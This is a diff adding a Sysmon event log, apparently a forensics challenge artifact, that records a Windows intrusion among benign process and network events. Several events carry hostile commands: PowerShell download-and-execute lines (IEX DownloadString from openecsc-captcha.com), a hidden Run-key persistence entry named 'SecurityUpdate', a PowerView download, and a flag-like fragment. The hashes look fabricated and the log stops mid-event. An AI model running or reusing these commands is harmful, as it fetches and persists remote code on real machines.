@@ -1,0 +1,735 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Events>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T13:45:12.1234567Z"/>
+    <EventRecordID>245880</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 13:45:12.123</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002100}</Data>
+    <Data Name="ProcessId">3245</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.746</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe -Command "Get-ExecutionPolicy"</Data>
+    <Data Name="CurrentDirectory">C:\Windows\System32</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA1=A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6,MD5=B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6,SHA256=D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8,IMPHASH=A1B2C3D4E5F6789012345678901234567</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002000}</Data>
+    <Data Name="ParentProcessId">2456</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>3</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>3</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T13:50:23.4567890Z"/>
+    <EventRecordID>245881</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 13:50:23.456</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002150}</Data>
+    <Data Name="ProcessId">4123</Data>
+    <Data Name="Image">C:\Program Files\Windows Defender\MpCmdRun.exe</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">172.18.0.2</Data>
+    <Data Name="SourceHostname">DESKTOP-7B8K9L2</Data>
+    <Data Name="SourcePort">52234</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">13.107.42.14</Data>
+    <Data Name="DestinationHostname">wdcp.microsoft.com</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationPortName">https</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:05:45.7890123Z"/>
+    <EventRecordID>245882</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:05:45.789</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002200}</Data>
+    <Data Name="ProcessId">5678</Data>
+    <Data Name="Image">C:\Program Files (x86)\Sysinternals\PsExec.exe</Data>
+    <Data Name="FileVersion">2.34</Data>
+    <Data Name="Description">Execute processes remotely</Data>
+    <Data Name="Product">Sysinternals PsExec</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PsExec.exe</Data>
+    <Data Name="CommandLine">"C:\Program Files (x86)\Sysinternals\PsExec.exe" -s -d cmd.exe</Data>
+    <Data Name="CurrentDirectory">C:\Users\bagagwauser\Downloads\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="Hashes">SHA1=E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6,MD5=F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6,SHA256=A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8,IMPHASH=C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002190}</Data>
+    <Data Name="ParentProcessId">3456</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:08:15.2345678Z"/>
+    <EventRecordID>245883</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:08:15.234</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002250}</Data>
+    <Data Name="ProcessId">2890</Data>
+    <Data Name="Image">C:\Windows\System32\winlogon.exe</Data>
+    <Data Name="TargetObject">HKLM\Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\LastLoggedOnSAMUser</Data>
+    <Data Name="Details">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:12:33.5678901Z"/>
+    <EventRecordID>245884</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:12:33.567</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002300}</Data>
+    <Data Name="ProcessId">6789</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.746</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe -Command "Get-WinEvent -LogName System | Where-Object {$_.LevelDisplayName -eq 'Error'} | Select-Object -First 10"</Data>
+    <Data Name="CurrentDirectory">C:\Users\bagagwauser\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA1=A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6,MD5=B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6,SHA256=D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8,IMPHASH=A1B2C3D4E5F6789012345678901234567</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002280}</Data>
+    <Data Name="ParentProcessId">4567</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe /c "powershell -Command Get-WinEvent -LogName System | Where-Object {$_.LevelDisplayName -eq 'Error'} | Select-Object -First 10"</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:23.4562871Z"/>
+    <EventRecordID>245891</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:23.456</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002400}</Data>
+    <Data Name="ProcessId">4892</Data>
+    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+    <Data Name="FileVersion">122.0.6261.95</Data>
+    <Data Name="Description">Google Chrome</Data>
+    <Data Name="Product">Google Chrome</Data>
+    <Data Name="Company">Google LLC</Data>
+    <Data Name="OriginalFileName">chrome.exe</Data>
+    <Data Name="CommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --lang=en-US --enable-auto-reload</Data>
+    <Data Name="CurrentDirectory">C:\Users\bagagwauser\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA1=D8E788A5906C4E72B8F3C5F9E2A4B1D7F9A0B8C3,MD5=A1B2C3D4E5F6789012345678901234567,SHA256=C7B8F3E9A1D5E7C4B2F6A9E8D1C5B7A4F2E6D9C8B1A5E7F3D2C6B9A8E1F4C7B5,IMPHASH=F34D5F277DF6D8A4E5B1A2B8C7D3E6F9</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002300}</Data>
+    <Data Name="ParentProcessId">3456</Data>
+    <Data Name="ParentImage">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
+    <Data Name="ParentCommandLine">"C:\Program Files\Google\Chrome\Application\chrome.exe"</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:45.1234567Z"/>
+    <EventRecordID>245892</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:45.123</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.746</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://openecsc-captcha.com/api/v2/validate')"</Data>
+    <Data Name="CurrentDirectory">C:\Users\bagagwauser\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="Hashes">SHA1=A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6,MD5=B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6,SHA256=D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8,IMPHASH=A1B2C3D4E5F6789012345678901234567</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002400}</Data>
+    <Data Name="ParentProcessId">4892</Data>
+    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
+    <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
+    <Data Name="ParentUser">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>3</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>3</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:46.7891234Z"/>
+    <EventRecordID>245893</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:46.789</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">172.18.0.2</Data>
+    <Data Name="SourceHostname">DESKTOP-7B8K9L2</Data>
+    <Data Name="SourcePort">52341</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">172.18.0.3</Data>
+    <Data Name="DestinationHostname">-</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationPortName">https</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:50.3456789Z"/>
+    <EventRecordID>245894</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:50.345</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate</Data>
+    <Data Name="Details">powershell.exe -WindowStyle Hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://openecsc-captcha.com/api/system/update')</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:51.2468013Z"/>
+    <EventRecordID>245895</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:51.246</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a</Data>
+    <Data Name="Details">powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://openecsc-captcha.com/api/v2/validate')"\1</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:15:51.3568024Z"/>
+    <EventRecordID>245896</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:15:51.356</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList</Data>
+    <Data Name="Details">a</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>3</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>3</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:16:15.9876543Z"/>
+    <EventRecordID>245897</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:16:15.987</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="Protocol">TCP</Data>
+    <Data Name="Initiated">true</Data>
+    <Data Name="SourceIsIpv6">false</Data>
+    <Data Name="SourceIp">172.18.0.2</Data>
+    <Data Name="SourceHostname">DESKTOP-7B8K9L2</Data>
+    <Data Name="SourcePort">52342</Data>
+    <Data Name="SourcePortName">-</Data>
+    <Data Name="DestinationIsIpv6">false</Data>
+    <Data Name="DestinationIp">172.18.0.3</Data>
+    <Data Name="DestinationHostname">-</Data>
+    <Data Name="DestinationPort">443</Data>
+    <Data Name="DestinationPortName">https</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:16:45.2468013Z"/>
+    <EventRecordID>245898</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:16:45.246</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\b</Data>
+    <Data Name="Details">ruNNNNN_1338}</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>13</EventID>
+    <Version>2</Version>
+    <Level>4</Level>
+    <Task>13</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:16:45.3578034Z"/>
+    <EventRecordID>245899</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="EventType">SetValue</Data>
+    <Data Name="UtcTime">2024-03-15 14:16:45.357</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002500}</Data>
+    <Data Name="ProcessId">7234</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList</Data>
+    <Data Name="Details">ab</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+  </EventData>
+</Event>
+
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-03-15T14:16:50.8901234Z"/>
+    <EventRecordID>245900</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="2148" ThreadID="3892"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>DESKTOP-7B8K9L2</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-03-15 14:16:50.890</Data>
+    <Data Name="ProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002600}</Data>
+    <Data Name="ProcessId">8901</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.746</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -OutFile 'C:\Users\bagagwauser\Desktop\PowerView.ps1'"</Data>
+    <Data Name="CurrentDirectory">C:\Users\bagagwauser\</Data>
+    <Data Name="User">DESKTOP-7B8K9L2\bagagwauser</Data>
+    <Data Name="LogonGuid">{a23d8dcf-3a2b-65f2-e703-1a0000000000}</Data>
+    <Data Name="LogonId">0x1a03e7</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">Medium</Data>
+    <Data Name="Hashes">SHA1=A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6,MD5=B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6,SHA256=D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8,IMPHASH=A1B2C3D4E5F6789012345678901234567</Data>
+    <Data Name="ParentProcessGuid">{a23d8dcf-3c8e-65f2-1a03-000000002580}</Data>
+    <Data Name="ParentProcessId">7890</Data>
